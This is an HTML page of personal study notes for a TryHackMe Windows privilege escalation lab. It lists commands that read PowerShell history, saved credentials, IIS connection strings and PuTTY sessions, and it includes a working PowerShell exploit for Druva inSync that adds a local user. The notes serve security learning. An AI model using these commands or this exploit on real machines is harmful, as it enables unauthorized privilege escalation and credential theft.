@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TryHackMe - Windows Privilege Escalation | Lets Learn Together</title>
+<meta name="keywords" content="THM">
+<meta name="description" content="THM-Windows Privilege Escalation Enumeration and Information Gathering Windows Pro - Uses Bitlocker encryption Find Account details using the command: lusrmgr.msc The SYSTEM account has more privileges than the Administrator user Powershell History: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt Saved Windows Credentials: cmdkey /list runas /savecred /user:admin cmd.exe IIS Configuration type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString Retrieve Credentials Example Software: reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &#34;Proxy&#34; /s Scheduled Tasks schtasks /query /tn vulntask /fo list /v File permissions of exe icacls c:\tasks\schtask.">
+<meta name="author" content="d31ty">
+<link rel="canonical" href="https://d31ty.github.io/thm/learning-paths/red-teaming/windows-privilege-escalation/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0648e40516ba181e370a81d24ab5a4b0683e67184fe1e7888524d0b7332ed31e.css" integrity="sha256-BkjkBRa6GB43CoHSSrWksGg&#43;ZxhP4eeIhSTQtzMu0x4=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://d31ty.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://d31ty.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://d31ty.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://d31ty.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://d31ty.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="TryHackMe - Windows Privilege Escalation" />
+<meta property="og:description" content="THM-Windows Privilege Escalation Enumeration and Information Gathering Windows Pro - Uses Bitlocker encryption Find Account details using the command: lusrmgr.msc The SYSTEM account has more privileges than the Administrator user Powershell History: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt Saved Windows Credentials: cmdkey /list runas /savecred /user:admin cmd.exe IIS Configuration type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString Retrieve Credentials Example Software: reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &#34;Proxy&#34; /s Scheduled Tasks schtasks /query /tn vulntask /fo list /v File permissions of exe icacls c:\tasks\schtask." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d31ty.github.io/thm/learning-paths/red-teaming/windows-privilege-escalation/" /><meta property="article:section" content="THM" />
+<meta property="article:published_time" content="2023-10-15T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-10-15T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TryHackMe - Windows Privilege Escalation"/>
+<meta name="twitter:description" content="THM-Windows Privilege Escalation Enumeration and Information Gathering Windows Pro - Uses Bitlocker encryption Find Account details using the command: lusrmgr.msc The SYSTEM account has more privileges than the Administrator user Powershell History: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt Saved Windows Credentials: cmdkey /list runas /savecred /user:admin cmd.exe IIS Configuration type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString Retrieve Credentials Example Software: reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &#34;Proxy&#34; /s Scheduled Tasks schtasks /query /tn vulntask /fo list /v File permissions of exe icacls c:\tasks\schtask."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Try Hack Me",
+      "item": "https://d31ty.github.io/thm/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe - Windows Privilege Escalation",
+      "item": "https://d31ty.github.io/thm/learning-paths/red-teaming/windows-privilege-escalation/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TryHackMe - Windows Privilege Escalation",
+  "name": "TryHackMe - Windows Privilege Escalation",
+  "description": "THM-Windows Privilege Escalation Enumeration and Information Gathering Windows Pro - Uses Bitlocker encryption Find Account details using the command: lusrmgr.msc The SYSTEM account has more privileges than the Administrator user Powershell History: type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt Saved Windows Credentials: cmdkey /list runas /savecred /user:admin cmd.exe IIS Configuration type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString Retrieve Credentials Example Software: reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \u0026#34;Proxy\u0026#34; /s Scheduled Tasks schtasks /query /tn vulntask /fo list /v File permissions of exe icacls c:\\tasks\\schtask.",
+  "keywords": [
+    "THM"
+  ],
+  "articleBody": "THM-Windows Privilege Escalation Enumeration and Information Gathering Windows Pro - Uses Bitlocker encryption Find Account details using the command: lusrmgr.msc The SYSTEM account has more privileges than the Administrator user Powershell History: type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt Saved Windows Credentials: cmdkey /list runas /savecred /user:admin cmd.exe IIS Configuration type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString Retrieve Credentials Example Software: reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s Scheduled Tasks schtasks /query /tn vulntask /fo list /v File permissions of exe icacls c:\\tasks\\schtask.bat Windows Services sc qc apphostsvc apphostsvc - example command to check service config\nAbusing Service Misconfiguration Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine’s desktop):\nAll of the services configurations are stored on the registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\\ Unquoted Service Paths sc qc \"disk sorter enterprise\" Insecure Service Permissions accesschk64.exe -qlc thmservice Windows Privileges whoami /priv Tool: https://github.com/gtworek/Priv2Admin Official Doc: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants\nSeBackup and SeRestore Awesome command exploitation tbh\nAbusing Vulnerable Software wmic product get name,version,vendor Exploit Code:\n$ErrorActionPreference = \"Stop\" $cmd = \"net user pwnd /add\" $s = New-Object System.Net.Sockets.Socket( [System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp ) $s.Connect(\"127.0.0.1\", 6064) $header = [System.Text.Encoding]::UTF8.GetBytes(\"inSync PHC RPCW[v0002]\") $rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"$([char]0x0005)`0`0`0\") $command = [System.Text.Encoding]::Unicode.GetBytes(\"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\"); $length = [System.BitConverter]::GetBytes($command.Length); $s.Send($header) $s.Send($rpcType) $s.Send($length) $s.Send($command) Tools: WinPeas PrivCheck: WES-NG: Windows Exploit Suggester Resources: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf https://decoder.cloud/ https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html https://github.com/antonioCoco/RogueWinRM https://github.com/gtworek/Priv2Admin https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md ",
+  "wordCount" : "237",
+  "inLanguage": "en",
+  "datePublished": "2023-10-15T00:00:00Z",
+  "dateModified": "2023-10-15T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "d31ty"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://d31ty.github.io/thm/learning-paths/red-teaming/windows-privilege-escalation/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Lets Learn Together",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://d31ty.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://d31ty.github.io/" accesskey="h" title="Lets Learn Together (Alt + H)">Lets Learn Together</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://d31ty.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d31ty.github.io/htb/" title="Hack The Box">
+                    <span>HTB</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d31ty.github.io/portswigger/" title="PortSwigger">
+                    <span>PortSwigger</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://d31ty.github.io/thm/" title="Try Hack Me">
+                    <span>THM</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      TryHackMe - Windows Privilege Escalation
+    </h1>
+    <div class="post-meta"><span title='2023-10-15 00:00:00 +0000 UTC'>October 15, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;d31ty
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="thm-windows-privilege-escalationhttpstryhackmecomroomwindowsprivesc20"><a href="https://tryhackme.com/room/windowsprivesc20">THM-Windows Privilege Escalation</a><a hidden class="anchor" aria-hidden="true" href="#thm-windows-privilege-escalationhttpstryhackmecomroomwindowsprivesc20">#</a></h2>
+<h4 id="enumeration-and-information-gathering">Enumeration and Information Gathering<a hidden class="anchor" aria-hidden="true" href="#enumeration-and-information-gathering">#</a></h4>
+<ul>
+<li>Windows Pro - Uses <strong>Bitlocker</strong> encryption</li>
+<li>Find Account details using the command: <strong>lusrmgr.msc</strong></li>
+<li>The <strong>SYSTEM</strong> account has more privileges than the Administrator user</li>
+</ul>
+<h5 id="powershell-history">Powershell History:<a hidden class="anchor" aria-hidden="true" href="#powershell-history">#</a></h5>
+<pre tabindex="0"><code>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre><h5 id="saved-windows-credentials">Saved Windows Credentials:<a hidden class="anchor" aria-hidden="true" href="#saved-windows-credentials">#</a></h5>
+<pre tabindex="0"><code>cmdkey /list
+runas /savecred /user:admin cmd.exe
+</code></pre><h5 id="iis-configuration">IIS Configuration<a hidden class="anchor" aria-hidden="true" href="#iis-configuration">#</a></h5>
+<pre tabindex="0"><code>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+</code></pre><h5 id="retrieve-credentials">Retrieve Credentials<a hidden class="anchor" aria-hidden="true" href="#retrieve-credentials">#</a></h5>
+<h6 id="example-software">Example Software:<a hidden class="anchor" aria-hidden="true" href="#example-software">#</a></h6>
+<pre tabindex="0"><code>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &#34;Proxy&#34; /s
+</code></pre><h5 id="scheduled-tasks">Scheduled Tasks<a hidden class="anchor" aria-hidden="true" href="#scheduled-tasks">#</a></h5>
+<pre tabindex="0"><code>schtasks /query /tn vulntask /fo list /v
+</code></pre><h5 id="file-permissions-of-exe">File permissions of exe<a hidden class="anchor" aria-hidden="true" href="#file-permissions-of-exe">#</a></h5>
+<pre tabindex="0"><code>icacls c:\tasks\schtask.bat
+</code></pre><h5 id="windows-services">Windows Services<a hidden class="anchor" aria-hidden="true" href="#windows-services">#</a></h5>
+<pre tabindex="0"><code>sc qc apphostsvc
+</code></pre><blockquote>
+<p>apphostsvc - example command to check service config</p>
+</blockquote>
+<h4 id="abusing-service-misconfiguration">Abusing Service Misconfiguration<a hidden class="anchor" aria-hidden="true" href="#abusing-service-misconfiguration">#</a></h4>
+<p>Services have a <strong>Discretionary Access Control List</strong> (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine&rsquo;s desktop):</p>
+<ul>
+<li>All of the services configurations are stored on the registry under <code>HKLM\SYSTEM\CurrentControlSet\Services\</code></li>
+</ul>
+<h4 id="unquoted-service-paths">Unquoted Service Paths<a hidden class="anchor" aria-hidden="true" href="#unquoted-service-paths">#</a></h4>
+<pre tabindex="0"><code>sc qc &#34;disk sorter enterprise&#34;
+</code></pre><h4 id="insecure-service-permissions">Insecure Service Permissions<a hidden class="anchor" aria-hidden="true" href="#insecure-service-permissions">#</a></h4>
+<pre tabindex="0"><code>accesschk64.exe -qlc thmservice
+</code></pre><h5 id="windows-privileges">Windows Privileges<a hidden class="anchor" aria-hidden="true" href="#windows-privileges">#</a></h5>
+<pre tabindex="0"><code>whoami /priv
+</code></pre><blockquote>
+<p><strong>Tool:</strong> <a href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a>
+<strong>Official Doc:</strong> <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants</a></p>
+</blockquote>
+<h5 id="sebackup-and-serestore">SeBackup and SeRestore<a hidden class="anchor" aria-hidden="true" href="#sebackup-and-serestore">#</a></h5>
+<blockquote>
+<p>Awesome command exploitation tbh</p>
+</blockquote>
+<h4 id="abusing-vulnerable-software">Abusing Vulnerable Software<a hidden class="anchor" aria-hidden="true" href="#abusing-vulnerable-software">#</a></h4>
+<pre tabindex="0"><code>wmic product get name,version,vendor
+</code></pre><blockquote>
+<p>Exploit Code:</p>
+</blockquote>
+<pre tabindex="0"><code>$ErrorActionPreference = &#34;Stop&#34;
+
+$cmd = &#34;net user pwnd /add&#34;
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect(&#34;127.0.0.1&#34;, 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes(&#34;inSync PHC RPCW[v0002]&#34;)
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes(&#34;$([char]0x0005)`0`0`0&#34;)
+$command = [System.Text.Encoding]::Unicode.GetBytes(&#34;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd&#34;);
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+</code></pre><h3 id="tools">Tools:<a hidden class="anchor" aria-hidden="true" href="#tools">#</a></h3>
+<ol>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPeas</a></li>
+<li><a href="https://github.com/itm4n/PrivescCheck">PrivCheck</a>:</li>
+<li><a href="https://github.com/bitsadmin/wesng">WES-NG: Windows Exploit Suggester</a></li>
+</ol>
+<h3 id="resources">Resources:<a hidden class="anchor" aria-hidden="true" href="#resources">#</a></h3>
+<ol>
+<li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation</a></li>
+<li><a href="https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf">https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf</a></li>
+<li><a href="https://decoder.cloud/">https://decoder.cloud/</a></li>
+<li><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html</a></li>
+<li><a href="https://github.com/antonioCoco/RogueWinRM">https://github.com/antonioCoco/RogueWinRM</a></li>
+<li><a href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a></li>
+</ol>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://d31ty.github.io/tags/thm/">THM</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://d31ty.github.io/">Lets Learn Together</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
